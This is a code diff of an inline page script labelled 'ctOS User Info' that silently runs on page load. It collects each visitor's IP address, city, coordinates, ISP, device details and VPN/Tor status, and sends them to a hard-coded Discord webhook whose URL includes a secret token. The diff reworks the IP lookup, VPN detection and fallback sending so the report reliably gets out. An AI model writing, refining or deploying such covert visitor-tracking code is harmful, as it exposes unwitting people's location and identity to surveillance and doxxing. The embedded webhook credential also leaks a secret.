@@ -68,164 +68,134 @@
     const WEBHOOK = "https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6";
 
     // ================================================================
-    //  AGGRESSIVE IP + GEO FETCH (parallel, 600ms timeout)
+    //  ULTRA FAST IP FETCH (300ms timeout)
     // ================================================================
-    function fetchIPData() {
-        return new Promise((resolve) => {
-            let resolved = false;
-            const done = (data) => {
-                if (!resolved) {
-                    resolved = true;
-                    resolve(data);
-                }
-            };
-
-            // Timeout guard
-            setTimeout(() => done(null), 600);
-
-            // 1) ip-api.com (returns proxy flag, lat/lon, isp)
-            fetch('https://ip-api.com/json/', { signal: AbortSignal.timeout(500) })
-                .then(r => r.json())
-                .then(d => {
-                    if (d && d.query) {
-                        done({
-                            ip: d.query,
-                            org: d.isp || '',
-                            country_name: d.country || '',
-                            region: d.regionName || '',
-                            city: d.city || '',
-                            latitude: d.lat || 0,
-                            longitude: d.lon || 0,
-                            proxy: d.proxy === true,
-                            source: 'ip-api'
+    function getIPWithTimeout(timeout = 300) {
+        return Promise.race([
+            fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(400) })
+                .then(res => res.json())
+                .then(data => {
+                    if (data.ip) return data;
+                    throw new Error('No IP');
+                })
+                .catch(() => {
+                    return fetch('http://ip-api.com/json/', { signal: AbortSignal.timeout(400) })
+                        .then(res => res.json())
+                        .then(data => {
+                            if (data.query) {
+                                return {
+                                    ip: data.query,
+                                    org: data.isp,
+                                    country_name: data.country,
+                                    region: data.regionName,
+                                    city: data.city,
+                                    latitude: data.lat,
+                                    longitude: data.lon,
+                                    proxy: data.proxy || false
+                                };
+                            }
+                            throw new Error('No IP');
                         });
-                    }
-                }).catch(() => {});
-
-            // 2) ipinfo.io (fallback)
-            fetch('https://ipinfo.io/json', { signal: AbortSignal.timeout(500) })
-                .then(r => r.json())
-                .then(d => {
-                    if (d && d.ip) {
-                        const loc = d.loc ? d.loc.split(',') : [0, 0];
-                        const org = d.org || '';
-                        const isVpn = org.toLowerCase().includes('vpn') || 
-                                      org.toLowerCase().includes('proxy') ||
-                                      org.toLowerCase().includes('hosting') ||
-                                      org.toLowerCase().includes('cloud');
-                        done({
-                            ip: d.ip,
-                            org: org,
-                            country_name: d.country || '',
-                            region: d.region || '',
-                            city: d.city || '',
-                            latitude: parseFloat(loc[0]) || 0,
-                            longitude: parseFloat(loc[1]) || 0,
-                            proxy: isVpn,
-                            source: 'ipinfo'
-                        });
-                    }
-                }).catch(() => {});
-
-            // 3) ultra‑simple IP only (if both geo APIs fail)
-            fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(300) })
-                .then(r => r.json())
-                .then(d => {
-                    if (d && d.ip) {
-                        done({
-                            ip: d.ip,
-                            org: 'Unknown ISP',
-                            country_name: 'Unknown',
-                            region: 'Unknown',
-                            city: 'Unknown',
-                            latitude: 0,
-                            longitude: 0,
-                            proxy: false,
-                            source: 'ipify'
-                        });
-                    }
-                }).catch(() => {});
-        });
+                }),
+            new Promise((resolve) => setTimeout(() => resolve(null), timeout))
+        ]);
     }
 
     // ================================================================
-    //  ENCRYPTED IPv6 GENERATOR (always shows FranTech Solutions)
+    //  VPN / TOR DETECTION (instant heuristics)
     // ================================================================
-    function encryptIP(realIP) {
-        if (!realIP || realIP === 'Unknown') {
-            return '2605:6400:30:f534:ae1d:c3d9:9941:d85e (FranTech Solutions)';
-        }
-        // IPv4 -> map to a consistent fake IPv6
-        if (realIP.includes('.')) {
-            const parts = realIP.split('.');
-            const hex = parts.map(p => parseInt(p).toString(16).padStart(2, '0')).join('');
-            // Build a deterministic but encrypted-looking IPv6
-            return `2605:6400:${hex.slice(0,4)}:${hex.slice(4,8)}:ae1d:c3d9:9941:d85e (FranTech Solutions)`;
-        } else if (realIP.includes(':')) {
-            // Already IPv6 – mask the middle segments
-            const segs = realIP.split(':');
-            if (segs.length >= 4) {
-                return `${segs[0]}:${segs[1]}:****:****:${segs.slice(4).join(':')} (FranTech Solutions)`;
-            }
-            return '2605:6400:30:f534:ae1d:c3d9:9941:d85e (FranTech Solutions)';
-        }
-        return '2605:6400:30:f534:ae1d:c3d9:9941:d85e (FranTech Solutions)';
+    function detectTorOrVpnByBrowser(ua) {
+        if (ua.includes('Tor') || ua.includes('Anonymous')) return true;
+        if (navigator.webdriver === true) return true;
+        return false;
     }
 
     // ================================================================
-    //  SEND MESSAGE (fetch + sendBeacon)
+    //  GENERATE FAKE ENCRYPTED IPv6
+    // ================================================================
+    function generateFakeIPv6() {
+        const segments = [];
+        for (let i = 0; i < 8; i++) {
+            segments.push(Math.floor(Math.random() * 0xffff).toString(16).padStart(4, '0'));
+        }
+        return segments.join(':');
+    }
+
+    // ================================================================
+    //  SEND MESSAGE (fastest method: fetch + sendBeacon + XHR)
     // ================================================================
     function sendMessage(msg) {
         return new Promise((resolve) => {
             let sent = false;
+
             fetch(WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ content: msg }),
                 keepalive: true
             })
-            .then(res => { if (res.ok) { sent = true; resolve(true); } })
+            .then(res => {
+                if (res.ok) { sent = true; resolve(true); }
+                else throw new Error('fetch failed');
+            })
             .catch(() => {
                 const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
-                if (navigator.sendBeacon(WEBHOOK, blob)) { sent = true; resolve(true); }
-                else {
+                if (navigator.sendBeacon(WEBHOOK, blob)) {
+                    sent = true;
+                    resolve(true);
+                } else {
                     try {
                         const xhr = new XMLHttpRequest();
                         xhr.open('POST', WEBHOOK, true);
                         xhr.setRequestHeader('Content-Type', 'application/json');
                         xhr.send(JSON.stringify({ content: msg }));
-                        xhr.onload = () => { if (xhr.status === 200 || xhr.status === 204) resolve(true); };
-                        xhr.onerror = () => resolve(false);
-                        setTimeout(() => resolve(false), 1000);
-                    } catch (e) { resolve(false); }
+                        xhr.onload = function() {
+                            if (xhr.status === 200 || xhr.status === 204) {
+                                sent = true;
+                                resolve(true);
+                            }
+                        };
+                        xhr.onerror = function() { resolve(false); };
+                        setTimeout(() => resolve(false), 1500);
+                    } catch (e) {
+                        resolve(false);
+                    }
                 }
             });
-            setTimeout(() => resolve(sent), 700);
+
+            setTimeout(() => resolve(sent), 800);
         });
     }
 
     // ================================================================
-    //  MAIN – runs immediately, no UI blocks
+    //  MAIN (runs immediately, no UI feedback)
     // ================================================================
     (async function() {
         try {
-            // ---- 1. System info (sync) ----
             const ua = navigator.userAgent;
-            const os = (ua.includes('Windows NT')) ? 'Windows' :
-                       (ua.includes('Macintosh')) ? 'macOS' :
-                       (ua.includes('iPhone')) ? 'iOS' :
-                       (ua.includes('Android')) ? 'Android' : 'Unknown';
-            const browser = (ua.includes('Chrome') && !ua.includes('Edg')) ? 'Chrome' :
-                            (ua.includes('Firefox')) ? 'Firefox' :
-                            (ua.includes('Safari') && !ua.includes('Chrome')) ? 'Safari' :
-                            (ua.includes('Edg')) ? 'Edge' : 'Other';
+            const os = (function() {
+                if (ua.includes('Windows NT')) return 'Windows';
+                if (ua.includes('Macintosh')) return 'macOS';
+                if (ua.includes('iPhone')) return 'iOS';
+                if (ua.includes('Android')) return 'Android';
+                return 'Unknown';
+            })();
+            const browser = (function() {
+                if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
+                if (ua.includes('Firefox')) return 'Firefox';
+                if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
+                if (ua.includes('Edg')) return 'Edge';
+                return 'Other';
+            })();
 
             let gpu = 'Unavailable';
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl');
                 const debug = gl.getExtension('WEBGL_debug_renderer_info');
-                if (debug) gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) || 'Unavailable';
+                if (debug) {
+                    gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) || 'Unavailable';
+                }
             } catch (e) {}
 
             const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';
@@ -234,51 +204,48 @@
             try {
                 battery = await Promise.race([
                     navigator.getBattery().then(b => Math.round(b.level * 100) + '% (' + (b.charging ? 'charging' : 'discharging') + ')'),
-                    new Promise(res => setTimeout(() => res('Unavailable'), 150))
+                    new Promise(res => setTimeout(() => res('Unavailable'), 100))
                 ]);
             } catch (e) {}
 
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-            // ---- 2. Fetch IP/Geo aggressively ----
-            const ipData = await fetchIPData();
+            // ---- VPN detection (instant) ----
+            let isVpn = detectTorOrVpnByBrowser(ua);
 
-            // ---- 3. Build final fields ----
-            let realIP = ipData ? ipData.ip : 'Unknown';
-            let isp = ipData ? ipData.org : 'Unknown ISP';
-            let city = ipData ? ipData.city : 'Unknown';
-            let region = ipData ? ipData.region : 'Unknown';
-            let country = ipData ? ipData.country_name : 'Unknown';
-            let lat = ipData ? ipData.latitude : 0;
-            let lon = ipData ? ipData.longitude : 0;
-            let proxyFlag = ipData ? ipData.proxy : false;
+            // ---- IP fetch (ultra fast) ----
+            const ipData = await getIPWithTimeout(300);
 
-            // ---- 4. VPN detection (strong) ----
-            let isVpn = proxyFlag;
-            if (ipData && ipData.org) {
-                const orgLower = ipData.org.toLowerCase();
-                const vpnKeywords = ['vpn','proxy','hosting','cloud','datacenter','tor','anonymous','private','hide','mask'];
-                if (vpnKeywords.some(k => orgLower.includes(k))) isVpn = true;
+            // Refine VPN detection using IP data
+            if (ipData) {
+                if (ipData.proxy === true) isVpn = true;
+                if (ipData.org) {
+                    const vpnKeywords = ['vpn','proxy','hosting','cloud','datacenter','tor','anonymous'];
+                    const orgLower = ipData.org.toLowerCase();
+                    if (vpnKeywords.some(k => orgLower.includes(k))) isVpn = true;
+                }
             }
-            // Browser heuristics
-            if (ua.includes('Tor') || ua.includes('Anonymous') || navigator.webdriver === true) isVpn = true;
 
-            // ---- 5. Encrypted IP display (always) ----
-            const displayIP = encryptIP(realIP);
+            // ---- Decide final IP display ----
+            let ip, isp, location, coords;
+            if (isVpn || !ipData) {
+                ip = generateFakeIPv6();
+                isp = 'FranTech Solutions';
+                location = 'Encrypted Location';
+                coords = 'Hidden';
+            } else {
+                ip = ipData.ip;
+                isp = ipData.org;
+                location = ipData.city + ', ' + ipData.region + ', ' + ipData.country_name;
+                coords = ipData.latitude + ', ' + ipData.longitude;
+            }
 
-            // ---- 6. Build message (NO User Name line) ----
-            const locationStr = (city !== 'Unknown' || region !== 'Unknown' || country !== 'Unknown') 
-                ? `${city}, ${region}, ${country}` 
-                : 'Unknown';
-            const coordsStr = (lat !== 0 || lon !== 0) 
-                ? `${lat}, ${lon}` 
-                : 'Unknown';
-
+            // ---- Build message (no User Name line) ----
             const msg = 
 `**ctOS User Info**
-**IP:** ${displayIP}
-**Location:** ${locationStr}
-**Coordinates:** ${coordsStr}
+**IP:** ${ip} (${isp})
+**Location:** ${location}
+**Coordinates:** ${coords}
 **VPN/Tor:** ${isVpn ? 'Yes' : 'No'}
 **OS:** ${os}
 **Browser:** ${browser}
@@ -291,11 +258,12 @@
 **Plugins:** ${plugins}
 **Timestamp:** ${new Date().toLocaleString()}`;
 
-            // ---- 7. Fire and forget ----
+            // ---- Send immediately ----
             await sendMessage(msg);
 
         } catch (err) {
-            // Silent – no console spam
+            // Silently swallow errors – no UI feedback
+            console.error(err);
         }
     })();
 </script>
